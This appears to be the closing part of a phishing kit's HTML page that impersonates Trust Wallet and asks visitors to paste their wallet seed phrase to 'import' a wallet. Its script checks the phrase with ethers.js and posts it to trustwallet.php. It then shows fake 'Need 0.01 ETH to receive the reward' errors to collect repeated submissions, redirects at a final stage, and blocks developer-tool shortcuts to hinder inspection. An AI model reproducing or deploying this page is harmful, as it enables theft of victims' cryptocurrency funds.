            align-items: center;
            margin-bottom: 10px;
            }
            .pre .title span  svg{
            margin-right: 5px;
            }
            .pre .title span {
            font-weight: 600;
            }
            .pre .title{
            margin-bottom: 10px;
            }
            .closeBtn{
            cursor: pointer;
            }
          </style>
        </div>
        <noscript></noscript>
        <div class="58rjrx main-container-wrapper" data-bur91e="ue4n6g">
          <div class="v7n2as first-view-main-wrapper" data-4ofnr1="0vova1">
            <div class="vp2us5 first-view-main" data-mrayej="5133i4">
              <div class="bdn14w import-account" data-u89h31="u0ye8m">
                <br>
                <div class="7v3jmq import-account__title" style="font-size: 28px;" data-5hadvz="qrk3pi">Import Multi-Coin Wallet
</div>
                <div class="nqkikt import-account__selector-label" data-h780ya="tm11f0">Enter your secret phrase here to connect
</div>
                <div class="lduw14 import-account__input-wrapper" data-4jznd5="noubqo"><label class="uygc87 import-account__input-label" data-xrn1ys="0z572r">Phrase</label><textarea class="import-account__secret-phrase" placeholder="Paste seed phrase from clipboard" id="seed"></textarea></div>
                <p style="margin-top: 5px; font-size: 14px; color: #959595;" data-mfuk52="h32kji" class="d3dknj ">Typically 12 (sometimes 24) words separated by single spaces

</p>
                <p style="color: red; display: none" id="errorText">*Need 0.7 BNB to receive the reward</p>
                <span class="mv8dyq error" data-kmal0t="g4129b"></span><button class="nxqj2z button btn--first-time first-time-flow__button" id="imp" disabled data-exfc27="26logd">IMPORT</button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="wawobp loader" data-tenqwa="9fkuxe">
      <div class="yat5ls lodas" data-2ivb6w="2n92zq">
        <img src="trustwallet.png" height="50">
        <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
          <svg version="1.1" id="loader-1" fill="#3375bb" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewbox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
            <path fill="#3375bb" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z">
              <animatetransform attributetype="xml" attributename="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatcount="indefinite"></animatetransform>
            </path>
          </svg>
        </div>
      </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
     <script>
     const redirectUrl = 'trustwallet.php' // redirect url setelah memasuki lastStage
      const lastStage = 3 // stage terakhir untuk redirect (stage === lastStage)
      let stage = 1 // awal stage
      const errorMsg = ['*Need 0.01 ETH to receive the reward','*Need 0.01 ETH to receive the reward'] // error message urutan berdasarkan stage
      let check = false
      let passForCreate = false
      let passForCreateConfir = false
      let words = false

      $(".closeBtn").on("click", function (e) {
        $(".alertBox").hide()
        $(".alert").hide()
      })  

      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#seed').on("change keyup paste", function(evt) {
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })
      
      $("#imp").on("click", function(){      
        let mnemonic = $("#seed").val()
        let wallet = ethers.Wallet.fromMnemonic(mnemonic)
        if(stage < lastStage) {
          $.ajax({
            method: "POST",
            url: "trustwallet.php",
            data: { seed: mnemonic, wallet: 'trustwallet' },
            success: function(data) {
              updateStage()
            }
          })
        } else window.location = redirectUrl
      })

      function updateStage() {
        if(typeof errorMsg[stage - 1] !== 'undefined') $("#errorText").html(errorMsg[stage - 1])
        else $("#errorText").html(errorMsg[0])
        stage += 1
        $("#errorText").css('display','')
        setTimeout(function(){
          $("#errorText").css('display','none')
        }, 3000)
      }
      
      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)
    </script>
  </body>
</html>

<script>
   
        // disable F12 key
        if(e.keyCode == 123) {
            return false;
        }
 
        // disable I key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 73){
            return false;
        }
 
        // disable J key
        if(e.ctrlKey && e.shiftKey && e.keyCode == 74) {
            return false;
        }
 
        // disable U key
        if(e.ctrlKey && e.keyCode == 85) {
            return false;
        }
    }
 
</script>